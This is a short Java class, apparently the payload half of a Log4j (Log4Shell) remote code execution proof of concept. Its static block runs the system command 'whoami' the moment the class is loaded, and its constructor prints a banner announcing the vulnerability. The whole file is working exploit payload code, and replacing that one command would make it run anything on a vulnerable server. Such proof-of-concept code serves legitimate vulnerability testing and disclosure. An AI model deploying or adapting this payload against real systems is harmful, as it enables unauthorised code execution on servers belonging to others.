public class POC {
        static {
                try {
                        Runtime.getRuntime().exec("whoami").waitFor();
                } catch (Exception e) {
                        e.printStackTrace();
                }
        }

        public POC() {
		System.out.println("LOG4J POC - REMOTE CODE EXECUTION VULNERABILITY");
	}
}
